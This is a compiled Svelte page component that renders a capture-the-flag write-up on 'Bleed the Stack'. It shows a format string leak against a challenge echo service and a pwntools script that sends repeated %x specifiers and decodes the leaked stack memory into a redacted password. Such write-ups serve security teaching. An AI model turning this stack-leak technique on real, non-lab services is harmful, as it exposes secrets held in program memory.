import { c as create_ssr_component } from "./ssr.js";
const metadata = {
  "title": "Bleed the Stack",
  "description": "An amateur programmer decides that for his hello world program, he will echo whatever you say. Can you find his mistake?",
  "author": "0x0539",
  "date": "2023-05-16",
  "published": true
};
const Bleed_the_stack = create_ssr_component(($$result, $$props, $$bindings, slots) => {
  return `<h1 data-svelte-h="svelte-jvy5xj">bleed the stack</h1> <p data-svelte-h="svelte-1i2t9w2">(<a href="https://0x0539.net/play/fangorn/bleedthestack" rel="nofollow">challenge page</a>)</p> <pre class="language-undefined"><!-- HTML_TAG_START -->${`<code class="language-undefined">pls@RUBY ~ &gt; nc challenges.0x0539.net 7070
ADVANCED CHALLENGE :: BLEED THE STACK
*****************************

Test me! Enter your name and I&#39;ll print it back to you!</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-1mj6rix">i started off by sending <code>%x</code> as a test, which immediately leaked hex values, so the program is likely vulnerable to a <a href="https://owasp.org/www-community/attacks/Format_string_attack" rel="nofollow">format string attack</a>:</p> <pre class="language-undefined"><!-- HTML_TAG_START -->${`<code class="language-undefined">Test me! Enter your name and I&#39;ll print it back to you!
%x %x %x %x %x %x %x %x
40 f7f77620 1 0 1 20656854 73736170 64726f77</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-h0f1rr">converting those hexadecimal values to ascii, we get the string <code>@÷÷v [f7f77620] ehTssapdrow</code> (<code>[f7f77620]</code> is invalid ascii). notably, <code>ehTssapdrow</code> is little-endian ordering of the ascii string <code>The password</code>.
we can build a python program with pwntools to send a tonne of ‘%x’ strings, pad out bytearrays with fewer than 4 bytes, and finally flip each dword. noting that some bytearrays dont appear to have a valid ascii representation, such as <code>f7f77620</code>, we can handle any errors by just setting the .</p> <pre class="language-python"><!-- HTML_TAG_START -->${`<code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'CRITICAL'</span>
host<span class="token punctuation">,</span>port <span class="token operator">=</span> <span class="token string">'challenges.0x0539.net'</span><span class="token punctuation">,</span> <span class="token number">7070</span>
format_str <span class="token operator">=</span> <span class="token string">'%x '</span> <span class="token operator">*</span> <span class="token number">299</span>

<span class="token keyword">def</span> <span class="token function">decode_bytes</span><span class="token punctuation">(</span>dword<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        decoded <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>dword<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment"># convert LE to BE</span>
        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>ch <span class="token keyword">for</span> ch <span class="token keyword">in</span> decoded <span class="token keyword">if</span> <span class="token number">32</span> <span class="token operator">&lt;=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">126</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> UnicodeDecodeError<span class="token punctuation">:</span> <span class="token comment"># dont bother converting if invalid ascii</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'UnicodeDecodeError on bytearray \\'</span></span><span class="token punctuation">&#123;</span>dword<span class="token punctuation">&#125;</span>\\<span class="token string">'.&#92;n'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f' </span><span class="token interpolation"><span class="token punctuation">&#123;</span>dword<span class="token punctuation">&#125;</span></span><span class="token string"> '</span></span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    s <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'you!&#92;n'</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>format_str<span class="token punctuation">)</span>

    raw_bytes <span class="token operator">=</span> s<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'&#92;nbytearray:&#92;n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>raw_bytes<span class="token punctuation">&#125;</span></span><span class="token string">&#92;n'</span></span><span class="token punctuation">)</span>
    dwords <span class="token operator">=</span> raw_bytes<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>
    dwords <span class="token operator">=</span> <span class="token punctuation">[</span>dword<span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> dword <span class="token keyword">in</span> dwords<span class="token punctuation">]</span> <span class="token comment"># pad out values lower than 4 bytes</span>
    decoded_dwords <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>decode_bytes<span class="token punctuation">(</span>dword<span class="token punctuation">)</span> <span class="token keyword">for</span> dword <span class="token keyword">in</span> dwords<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'leaked:&#92;n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>decoded_dwords<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span> <span class="token comment"># print result.</span>
    <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token string">'quitting'</span><span class="token punctuation">)</span>

main<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-3901yl">so our output from this program gives the following LE bytearray:</p> <pre class="language-bytearray"><!-- HTML_TAG_START -->${`<code class="language-bytearray">40 f7f20620 1 0 1 20656854 73736170 64726f77 3a736920 6c5f4920 5f337630 6d723066 625f7434 733675 25207825 78252078 20782520 25207825 78252078 20782520 25207825</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-1skm4tm">which the python script will convert to ascii:</p> <pre class="language-bash"><!-- HTML_TAG_START -->${`<code class="language-bash">@ f7f20620 The password is: <span class="token punctuation">[</span><span class="token punctuation">[</span>redacted<span class="token punctuation">]</span><span class="token punctuation">]</span> %x %x %x %x %x %x %x %x %x %</code>`}<!-- HTML_TAG_END --></pre>`;
});
export {
  Bleed_the_stack as default,
  metadata
};
